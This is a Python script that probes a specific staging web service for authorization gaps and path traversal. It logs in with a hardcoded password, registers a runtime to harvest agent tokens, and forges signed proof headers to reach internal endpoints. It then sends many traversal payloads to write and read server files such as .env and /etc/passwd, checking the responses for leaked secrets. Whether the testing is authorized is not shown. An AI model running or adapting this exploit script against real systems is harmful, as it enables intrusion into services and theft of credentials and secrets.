#!/usr/bin/env python3
# intent 28687 - STAGE empirical driver for apps/workflow `code-publish` path handling.
# stage-assistant.lumiiai.cn ; e2e-accept normal member + self-registered runtime identity.
import os, sys, json, time, base64, subprocess, hmac, hashlib, re

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)

HOST = "stage-assistant.lumiiai.cn"
EMAIL = "e2e-accept@lumii.dev"
PASS  = "E2eAccept!0813"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
START = time.time()
def el(): return int(time.time() - START)
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False)
    print("R:%s:%s" % (k, _b64(s)), flush=True)
def log(*a): print("L: " + " ".join(str(x) for x in a), flush=True)

def curl(args, timeout=30):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 12)
        return r.returncode, r.stdout, r.stderr[:300]
    except Exception as e:
        return -1, b"", repr(e)[:200]

def call(path, method="GET", body=None, hdrs=None, cookie=None, timeout=30, maxlen=300000, showhdr=False):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json",
            "-H", "Referer: https://%s/" % HOST, "-H", "Origin: https://%s" % HOST,
            "-w", "\n__CODE__%{http_code}"]
    if showhdr: args += ["-i"]
    if cookie: args += ["-b", "lumii_session=" + cookie]
    if hdrs:
        for k, v in hdrs.items(): args += ["-H", "%s: %s" % (k, v)]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace")
    code = ""
    i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"path": path, "code": code, "body": txt[:maxlen], "len": len(txt),
            "err": (err.decode("utf-8", "replace") if isinstance(err, (bytes, bytearray)) else str(err))}

def J(r):
    try: return json.loads(r["body"])
    except Exception: return None

COOKIE = None
RID = None; RTOKEN = None; ORG = None; ME = None; PROOF_KEY = None
PLATFORM = "dashboard"; SK = "conv_28687stage"

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def make_proof(actor, sk=SK, ttl=1500):
    if not PROOF_KEY: return ""
    now = int(time.time())
    claims = {"session_key": sk, "platform": PLATFORM, "chat_id": sk, "actor_id": actor,
              "iss": RID, "aud": RID, "iat": now - 5, "exp": now + ttl}
    p = b64u(json.dumps(claims, separators=(",", ":")).encode())
    sig = b64u(hmac.new(PROOF_KEY.encode(), p.encode(), hashlib.sha256).digest())
    return "v2." + p + "." + sig

def internal(name, extra=None, actor=None, maxlen=300000, timeout=30):
    b = {"platform": PLATFORM, "actor_id": actor or ME, "session_key": SK}
    if extra: b.update(extra)
    hdrs = {"Authorization": "Bearer " + (RTOKEN or ""), "x-agent-id": RID or ""}
    pr = make_proof(actor or ME)
    if pr: hdrs["x-lumii-turn-proof"] = pr
    return call("/internal/" + name, "POST", b, hdrs=hdrs, maxlen=maxlen, timeout=timeout)

# ---------- 1. login ----------
log("### stage login t=%ds" % el())
lr = call("/api/auth/login", "POST", {"identifier": EMAIL, "password": PASS}, showhdr=True)
m = re.search(r"lumii_session=([^;\s]+)", lr["body"])
COOKIE = m.group(1) if m else None
lrj = J({"body": lr["body"].split("\r\n\r\n")[-1]}) or {}
ME = (lrj.get("user") or {}).get("id")
ORG = (lrj.get("user") or {}).get("org")
R("01_login", {"code": lr["code"], "cookie": bool(COOKIE), "me": ME, "org": ORG})

# ---------- 2. /api/me ----------
mr = call("/api/me", cookie=COOKIE)
mj = J(mr) or {}
ME = mj.get("id") or ME; ORG = mj.get("org") or ORG
R("02_me", {"code": mr["code"], "name": mj.get("name"), "role": mj.get("roleName"),
            "me": ME, "org": ORG})

# ---------- 3. register runtime -> machine identity ----------
rr = call("/api/runtimes", "POST", {"name": "probe28687"}, cookie=COOKIE, maxlen=60000, timeout=40)
rtxt = rr["body"]
def grab(pfx):
    mm = re.search(pfx + r"['\"]?\s*[=:]\s*['\"]([^'\"\s]+)['\"]", rtxt)
    return mm.group(1) if mm else None
TPS = grab("TURN_PROOF_SECRET"); RID = grab("AGENT_ID"); RTOKEN = grab("AGENT_TOKEN")
rjson = J(rr) or {}
if not RID: RID = rjson.get("agent_id") or rjson.get("agentId") or (rjson.get("runtime") or {}).get("id")
if not RTOKEN: RTOKEN = rjson.get("agent_token") or rjson.get("agentToken") or rjson.get("token")
R("03_runtime", {"code": rr["code"], "have_tps": bool(TPS), "rid": RID, "have_token": bool(RTOKEN),
                 "bodyhead": rtxt[:400] if not RTOKEN else ""})
if TPS: R("03_tps", TPS)

# ---------- 4. keys/current -> proof_key ----------
if RID and RTOKEN:
    k = call("/api/runtimes/keys/current", hdrs={"x-agent-id": RID, "x-agent-token": RTOKEN})
    kj = J(k) or {}
    PROOF_KEY = kj.get("proof_key") or kj.get("legacy_secret")
    R("04_keys", {"code": k["code"], "have_pk": bool(PROOF_KEY), "v": kj.get("proof_key_version"),
                  "body": k["body"][:300] if not PROOF_KEY else ""})

# ---------- 5. baseline /internal reachability ----------
p = internal("projects/list", {})
R("05_projects", {"code": p["code"], "body": p["body"][:400]})

# ---------- 6. apps code-* gating oracle (fake app id) ----------
FAKE = "app_AAAAAAAAAAAAAAAA"
o1 = internal("apps/code-init", {"app_id": FAKE, "template": "static"})
o2 = internal("apps/code-snapshot", {"app_id": FAKE, "files": [{"path": "x_probe.txt", "content": "x"}]})
o3 = internal("apps/code-publish", {"app_id": FAKE})
o4 = internal("apps/handoff", {"requirement": "probe28687 noop", "folder_id": "tkf_FAKEFAKEFAKE"})
R("06_gate", {"code_init": o1["code"], "init_body": o1["body"][:300],
              "code_snapshot": o2["code"], "snap_body": o2["body"][:300],
              "code_publish": o3["code"], "pub_body": o3["body"][:200],
              "handoff": o4["code"], "handoff_body": o4["body"][:300]})

# folders
res = internal("tickets/resolve", {}, maxlen=600000)
rj = J(res) or {}
folders = [f.get("id") for f in (rj.get("folders") or []) if f.get("id")]
R("06b_resolve", {"code": res["code"], "folders": len(folders), "first": folders[:3]})

gate_passed = o1["code"] in ("404", "400") and "builder_only" not in o1["body"]
R("06c_verdict", {"gate_passed": gate_passed})

app_id = None; link = None; vno = None
if gate_passed and folders:
    # ---------- 7. create own app (handoff, no builder gate) ----------
    fid = folders[0]
    h = internal("apps/handoff", {"requirement": "probe28687 code site", "folder_id": fid, "name": "probe28687"})
    hj = J(h) or {}
    app_id = (hj.get("app") or {}).get("id") or hj.get("app_id")
    R("07_handoff", {"code": h["code"], "app_id": app_id, "body": h["body"][:600]})

if app_id:
    # ---------- 8. code-init static ----------
    ci = internal("apps/code-init", {"app_id": app_id, "template": "static"})
    R("08_code_init", {"code": ci["code"], "body": ci["body"][:500]})
    # ---------- 9. write-traversal probes (expect 400, no disk escape) ----------
    variants = {
        "dotdot": "../../../../../../opt/lumii-stage/.env.dev",
        "encoded": "..%2f..%2f..%2f..%2fopt%2flumii-stage%2f.env.dev",
        "abs": "/opt/lumii-stage/.env.dev",
        "backslash": "..\\..\\..\\..\\opt\\lumii-stage\\.env.dev",
        "double": "....//....//....//....//opt/lumii-stage/.env.dev",
        "tilde": "~/x_probe.txt",
    }
    for nm, pathv in variants.items():
        w = internal("apps/code-snapshot", {"app_id": app_id, "files": [{"path": pathv, "content": "x_probe28687"}]})
        R("09_write_%s" % nm, {"code": w["code"], "body": w["body"][:300]})
    # ---------- 10. positive snapshot ----------
    files = [{"path": "index.html", "content": "<html><body>x_probe28687</body></html>"},
             {"path": "x_probe.txt", "content": "x_probe28687_marker"}]
    cs = internal("apps/code-snapshot", {"app_id": app_id, "files": files, "note": "probe28687"})
    csj = J(cs) or {}
    vno = (csj.get("version") or {}).get("no")
    R("10_snapshot", {"code": cs["code"], "vno": vno, "body": cs["body"][:600]})
    # ---------- 11. make public: try internal set-access, fallback web ----------
    sa = internal("apps/set-access", {"app_id": app_id, "mode": "public"})
    R("11_setaccess_internal", {"code": sa["code"], "body": sa["body"][:500]})
    if sa["code"] not in ("200",):
        wa = call("/api/apps/%s/access" % app_id, "POST", {"mode": "public"}, cookie=COOKIE)
        R("11_setaccess_web", {"code": wa["code"], "body": wa["body"][:500]})
    # ---------- 12. publish ----------
    cp = internal("apps/code-publish", {"app_id": app_id}, maxlen=60000)
    cpj = J(cp) or {}
    pu = rjson  # unused
    link = (cpj.get("public_url") or "").strip() or None
    R("12_publish", {"code": cp["code"], "body": cp["body"][:800], "public_url": link})
    # ---------- 13. read route: static /l/<token>/ ----------
    if link and "/l/" in link:
        tok = link.split("/l/")[1].strip("/")
        reads = {
            "index": "",
            "marker": "x_probe.txt",
            "trav_dotdot": "../../../../../../opt/lumii-stage/.env.dev",
            "trav_enc1": "..%2f..%2f..%2f..%2f..%2f..%2fopt%2flumii-stage%2f.env.dev",
            "trav_enc2": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fopt%2flumii-stage%2f.env.dev",
            "trav_dbl": "..%252f..%252f..%252f..%252f..%252f..%252fopt%252flumii-stage%252f.env.dev",
            "trav_abs": "/opt/lumii-stage/.env.dev",
            "trav_back": "..%5c..%5c..%5c..%5c..%5c..%5copt%5clumii-stage%5c.env.dev",
            "etc_passwd": "../../../../../../etc/passwd",
        }
        for nm, rel in reads.items():
            rd = call("/l/%s/%s" % (tok, rel), timeout=20, maxlen=3000, showhdr=(nm == "marker"))
            hdr = rd["body"].split("\r\n\r\n")[0] if rd["body"].startswith("HTTP") else ""
            body = rd["body"].split("\r\n\r\n")[-1]
            R("13_read_%s" % nm, {"code": rd["code"], "len": rd["len"], "head": body[:200],
                                  "leak": ("JWT_SECRET" in body or "DATABASE_URL" in body or "PRIVATE KEY" in body),
                                  "csp": ("sandbox" in hdr), "nosniff": ("nosniff" in hdr)})
    # ---------- 14. read route: signed preview ----------
    cr = call("/api/apps/%s/code" % app_id, cookie=COOKIE, maxlen=40000)
    crj = J(cr) or {}
    prev = None
    for v in (crj.get("versions") or []):
        if v.get("previewUrl"): prev = v["previewUrl"]; break
    R("14_code_list", {"code": cr["code"], "publicUrl": crj.get("publicUrl"), "preview": prev,
                       "body": cr["body"][:400] if not prev else ""})
    if prev:
        if not prev.endswith("/"): prev += "/"
        for nm, rel in [("idx", ""), ("marker", "x_probe.txt"),
                        ("trav_dotdot", "../../../../../../opt/lumii-stage/.env.dev"),
                        ("trav_enc", "..%2f..%2f..%2f..%2f..%2f..%2fopt%2flumii-stage%2f.env.dev"),
                        ("trav_abs", "/opt/lumii-stage/.env.dev")]:
            rd = call(prev + rel, timeout=20, maxlen=2500)
            R("14_prev_%s" % nm, {"code": rd["code"], "len": rd["len"], "head": rd["body"][:160],
                                  "leak": ("JWT_SECRET" in rd["body"] or "PRIVATE KEY" in rd["body"])})

R("DONE", {"t": el(), "gate_passed": gate_passed, "app_id": app_id, "link": link, "vno": vno})
